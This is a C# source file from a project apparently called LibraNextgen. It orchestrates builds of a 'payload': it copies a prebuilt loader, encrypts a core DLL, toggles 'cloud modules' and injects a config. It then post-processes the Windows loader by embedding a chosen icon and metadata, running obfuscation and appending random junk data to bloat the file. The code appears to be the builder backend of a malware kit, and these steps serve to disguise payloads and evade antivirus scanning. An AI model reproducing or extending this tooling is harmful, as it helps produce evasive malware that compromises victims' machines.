using LibraNextgen.Common.Models;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Services.Builder;

/// <summary>
/// Template-mode build orchestration (LIBRA_BUILDER_MODE=template, default):
/// every Rust artifact comes from the verified template cache, so the server
/// only encrypts the core, syncs cloud modules, prepares the loader and
/// injects the config — no cargo/rustup/zig dependency at all.
/// </summary>
public partial class BuilderBuildService
{
    /// <summary>True when builds run without a Rust toolchain (the default).</summary>
    public static bool TemplateBuildMode => TemplateManagerService.LoadConfig().TemplateMode;

    /// <summary>Build a payload entirely from prebuilt templates.</summary>
    private async Task RunTemplateBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
    {
        var ctx = new BuildContext
        {
            BuildId = buildId,
            Req = req,
            TempDir = Path.Combine(OutputBase, buildId),
            FinalDir = Path.Combine(OutputBase, buildId),
            TargetDir = SharedTargetDir,
            TargetTriple = ResolveTriple(req.Platform, OperatingSystem.IsWindows()),
            TargetOs = OsOf(req.Platform),
            IsWindows = OsOf(req.Platform) == "windows",
            IsMacos = OsOf(req.Platform) == "macos",
            ModuleExt = ModuleExt(req.Platform),
            ModulesDir = ModulesDirFor(req.Platform),
        };

        try
        {
            lock (BuildLock)
            {
                if (Directory.Exists(ctx.TempDir)) Directory.Delete(ctx.TempDir, true);
                Directory.CreateDirectory(ctx.TempDir);
            }

            var tplDir = TemplateManagerService.CacheDir(req.Platform);
            var (loaderName, desktopLoader, coreName) = TemplateManagerService.PayloadNames(req.Platform);
            var cached = await _templates.EnsureAsync(req.Platform, job.Log);
            job.Log($"=== Template payload build ({ctx.TargetTriple}) ===");
            job.Log($"Template {req.Platform}: tag {cached.Tag}, commit {cached.Commit}");

            // ── Core (copy from template, encrypt server-side) ──
            ctx.CoreDllPath = Path.Combine(tplDir, coreName);
            await Stage2_EncryptCoreAsync(ctx, job);

            // ── Cloud modules (copy from template, apply enable/disable) ──
            SyncModulesFromTemplate(ctx, job);

            // ── Loader (console or desktop variant) ──
            var desktop = req.ApplicationType == "Desktop";
            var entry = desktop ? desktopLoader : loaderName;
            if (desktop && entry == null)
            {
                job.Fail($"desktop loader is not published for {req.Platform} in this template");
                UpdateHistory(job);
                return;
            }
            if (!CopyTemplateEntry(tplDir, entry!, ctx, job)) return;

            await ApplyLoaderPostProcessAsync(ctx, job);

            // ── Encrypt already done — finalize: inject config + move to output ──
            await Stage4_InjectConfigAsync(ctx, job);
            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail($"Template build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                ActiveJobs.TryRemove(buildId, out _);
            });
        }
    }

    /// <summary>Copy the loader entry from the template into the temp build dir.</summary>
    private bool CopyTemplateEntry(string tplDir, string entry, BuildContext ctx, BuildJob job)
    {
        var src = Path.Combine(tplDir, entry);
        if (!File.Exists(src))
        {
            job.Fail($"loader entry '{entry}' not found in the {ctx.Req.Platform} template — regenerate templates on a newer tag");
            UpdateHistory(job);
            return false;
        }
        var exeName = ctx.IsWindows ? "loader.exe" : "loader";
        var exePath = Path.Combine(ctx.TempDir, exeName);
        File.Copy(src, exePath, true);
        ctx.ExePath = exePath;
        job.Log($"Loader ready from template: {new FileInfo(exePath).Length / 1024} KB");
        return true;
    }

    /// <summary>
    /// Bring the platform module directory in line with the template + the
    /// requested enable/disable set (mirror of Stage 1.6 without cargo).
    /// </summary>
    private void SyncModulesFromTemplate(BuildContext ctx, BuildJob job)
    {
        var enabled = EnabledModuleList(ctx).ToHashSet(StringComparer.Ordinal);
        var tplDir = TemplateManagerService.CacheDir(ctx.Req.Platform);
        var deployed = 0;
        Directory.CreateDirectory(ctx.ModulesDir);

        foreach (var (module, _) in CloudModules)
        {
            var src = Path.Combine(tplDir, $"{module}.{ctx.ModuleExt}");
            var normal = Path.Combine(ctx.ModulesDir, $"{module}.{ctx.ModuleExt}");
            var disabled = normal + ".disable";
            if (enabled.Contains(module))
            {
                if (!File.Exists(src))
                {
                    job.Log($"[WARN] module '{module}' absent from the {ctx.Req.Platform} template — skipped");
                    continue;
                }
                File.Copy(src, normal, true);
                if (File.Exists(disabled)) File.Delete(disabled);
                deployed++;
            }
            else if (File.Exists(normal))
            {
                File.Move(normal, disabled, true);
                job.Log($"Disabled module {module}.{ctx.ModuleExt} -> {module}.{ctx.ModuleExt}.disable");
            }
        }
        job.Log($"Cloud modules synced from template: {deployed}/{CloudModules.Length} -> {ctx.ModulesDir}");
    }

    /// <summary>Template-mode twin of <see cref="BuildModulesOnlyAsync"/>: sync modules from the template instead of compiling.</summary>
    private async Task<ModuleBuildResult> BuildModulesFromTemplateAsync(BuildContext ctx, BuildJob job)
    {
        var result = new ModuleBuildResult();
        try
        {
            var cached = await _templates.EnsureAsync(ctx.Req.Platform, job.Log);
            job.Log($"Syncing cloud modules for {ctx.Req.Platform} from template {cached.Tag} (commit {cached.Commit})");
            SyncModulesFromTemplate(ctx, job);
            result.Compiled = true;
            result.Deployed = CloudModules
                .Select(m => m.Module)
                .Where(m => File.Exists(Path.Combine(ctx.ModulesDir, $"{m}.{ctx.ModuleExt}")))
                .ToList();
            result.Missing = CloudModules.Select(m => m.Module).Except(result.Deployed).ToList();
        }
        catch (Exception ex)
        {
            job.Log($"[ERROR] template module sync failed: {ex.Message}");
            result.Compiled = false;
            result.Missing = CloudModules.Select(m => m.Module).ToList();
        }
        return result;
    }

    /// <summary>
    /// Windows PE post-processing (icon/metadata embedding, goldberg
    /// obfuscation) plus junk-data appending — shared by the source and the
    /// template build paths.
    /// </summary>
    private static async Task ApplyLoaderPostProcessAsync(BuildContext ctx, BuildJob job)
    {
        // ── Icon & metadata embedding via managed PE writer (Windows PE only) ──
        if (ctx.IsWindows && HasIconOrMetadata(ctx.Req))
        {
            await EmbedIconAndMetadata(ctx.Req, ctx.ExePath, job);
        }

        // ── Goldberg obfuscation (Windows PE only) ──
        if (ctx.IsWindows && ctx.Req.EnableObfuscation)
        {
            job.Log("Running goldberg obfuscation...");
            try
            {
                var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{ctx.ExePath}\"", job);
                if (goldbergResult.ExitCode == 0)
                    job.Log("Goldberg obfuscation completed.");
                else
                    job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
            }
            catch (Exception ex)
            {
                job.Log($"[WARN] goldberg not available: {ex.Message}");
            }
        }

        // ── Junk data injection ──
        if (ctx.Req.InjectJunkData && ctx.Req.JunkDataMb > 0)
        {
            job.Log($"Injecting {ctx.Req.JunkDataMb} MB junk data...");
            var junk = System.Security.Cryptography.RandomNumberGenerator.GetBytes(ctx.Req.JunkDataMb * 1024 * 1024);
            await using var fs = File.Open(ctx.ExePath, FileMode.Append);
            await fs.WriteAsync(junk);
        }
    }
}
